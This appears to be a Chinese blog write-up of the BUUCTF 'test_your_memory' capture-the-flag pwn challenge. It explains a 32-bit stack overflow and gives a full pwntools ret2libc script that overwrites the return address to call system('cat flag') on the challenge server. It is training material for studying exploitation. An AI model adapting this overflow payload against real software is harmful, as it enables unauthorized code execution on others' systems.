---
title: "BUUCTF Pwn Jarvisoj_test_your_memory"
date: 2020-05-02T20:09:48+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Jarvisoj_test_your_memory

考点：

1、32位栈溢出

3、ret2libc2

main函数

![image-20200502201206462](/images/image-20200502201206462.png)

mem_test函数

![image-20200502201246434](/images/image-20200502201246434.png)

![image-20200502201427979](/images/image-20200502201427979.png)

stack offset = 0x13 + 0x4(leave)

![image-20200502201543105](/images/image-20200502201543105.png)

存在system()和字符串"cat flag\"

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
#from LibcSearcher import *
from pwn import*
import sys
context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './memory' 
local = 0
if local == 1:
    sh = process(binary)
else:
    sh = remote("node3.buuoj.cn",27316)
elf = ELF(binary)
#libc=elf.libc
#libc = ELF('./.so')

fakerebp = 0x4
offset = 0x13 + fakerebp

system_addr = elf.plt['system']
str_cat_flag = 0x080487e0
main_addr = elf.symbols['main']
#溢出后的返回地址不填有效地址可能无法成功，所以填入main地址作为返回地址
payload = 'a'*offset + p32(system_addr) + p32(main_addr) +p32(str_cat_flag)
#sh.recvuntil('> ')
sh.sendline(payload)
sh.interactive()
```

![image-20200502202334114](/images/image-20200502202334114.png)